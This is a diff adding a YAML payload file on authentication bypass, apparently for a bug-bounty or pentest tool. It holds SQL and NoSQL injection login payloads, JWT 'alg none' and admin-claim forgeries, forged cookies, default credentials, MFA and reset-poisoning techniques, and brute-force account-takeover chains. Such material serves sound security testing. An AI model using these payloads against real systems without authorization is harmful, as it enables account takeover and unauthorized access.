@@ -1,0 +1,135 @@
+name: Authentication & Authorization Bypass
+description: >
+  Auth bypass encompasses broken authentication, session management flaws,
+  and authorization bypass vulnerabilities.
+
+basic_payloads:
+  - "admin@admin.com"
+  - "admin@example.com"
+  - "test@test.com"
+  - "' OR '1'='1' --"
+  - "admin' --"
+  - "admin"
+  - "password"
+  - "123456"
+  - "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.xXxXxX"
+  - "Authorization: Basic YWRtaW46YWRtaW4="
+
+bypass_techniques:
+  - name: SQLi Auth Bypass
+    description: Use SQL injection in login forms to bypass authentication
+    payloads:
+      - "' OR '1'='1' --"
+      - "admin' OR '1'='1' --"
+      - "' UNION SELECT 1,'admin','password'--"
+
+  - name: NoSQL Injection Auth Bypass
+    description: Exploit NoSQL injection in authentication
+    payloads:
+      - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+      - 'username[$ne]=admin&password[$ne]=x'
+      - '{"$or": [{"username": "admin"}, {"password": {"$regex": ".*"}}]}'
+
+  - name: JWT Manipulation
+    description: Tamper with JWT tokens to escalate privileges
+    payloads:
+      - '{"alg":"none","typ":"JWT"}'
+      - '{"alg":"HS256","typ":"JWT"}'
+      - '{"role":"admin","sub":"admin"}'
+      - '{"sub":"admin","iat":0}'
+
+  - name: Cookie Tampering
+    description: Modify session cookies for privilege escalation
+    payloads:
+      - "Cookie: session=admin"
+      - "Cookie: role=admin"
+      - "Cookie: is_admin=true"
+      - "Cookie: user=administrator; role=admin"
+
+  - name: OAuth Token Reuse
+    description: Reuse or replay OAuth tokens across contexts
+    payloads:
+      - "Reuse access_token from one client in another"
+      - "Cross-subdomain token reuse"
+      - "Bearer token from social login used in API"
+
+  - name: MFA Bypass
+    description: Various techniques to bypass MFA/2FA
+    payloads:
+      - "Reuse expired OTP codes"
+      - "Brute-force 6-digit OTP (rate limits permitting)"
+      - "Skip MFA step via direct navigation"
+      - "Downgrade to password-only authentication"
+      - "Reuse old session after MFA timeout"
+
+  - name: Password Reset Poisoning
+    description: Manipulate password reset flow to take over accounts
+    payloads:
+      - "Change Host header in reset request"
+      - "Add X-Forwarded-Host header"
+      - "Manipulate reset token in URL"
+      - "Brute-force weak reset tokens"
+
+detection_patterns:
+  - "authentication"
+  - "authorization"
+  - "login"
+  - "signin"
+  - "session"
+  - "jwt"
+  - "cookie"
+  - "token"
+  - "oauth"
+  - "saml"
+  - "forgot password"
+  - "reset password"
+  - "mfa"
+  - "2fa"
+  - "bypass"
+  - "privilege escalation"
+  - "account takeover"
+
+chain_templates:
+  - name: User Enum -> Brute Force -> ATO
+    description: Chain user enumeration with credential brute force for account takeover
+    requirements: [user_enum, login_endpoint, no_rate_limit]
+    steps:
+      - Confirm user enumeration via response differences
+      - Build valid username list
+      - Brute-force passwords on valid accounts
+      - Access account with cracked credentials
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: Weak Password Reset -> Account Takeover
+    description: Exploit weak password reset tokens for account takeover
+    requirements: [password_reset, predictable_token]
+    steps:
+      - Request password reset for target email
+      - Analyze reset token predictability
+      - Predict next token value
+      - Set new password and access account
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: JWT None Algorithm -> Admin Access
+    description: Exploit JWT none algorithm attack for privilege escalation
+    requirements: [jwt_auth, accepts_none_alg]
+    steps:
+      - Decode existing JWT token
+      - Change alg to "none"
+      - Modify payload claims (role: admin)
+      - Access admin endpoints with forged token
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+h1_references:
+  - report_id: "XXXXX"
+    title: "OAuth misconfiguration leads to account takeover"
+    technique: "OAuth redirect URI manipulation"
+    severity: "critical"
+  - report_id: "XXXXX"
+    title: "JWT none algorithm bypass"
+    technique: "JWT algorithm confusion"
+    severity: "high"
+  - report_id: "XXXXX"
+    title: "Weak password reset token"
+    technique: "Predictable reset token"
+    severity: "high"
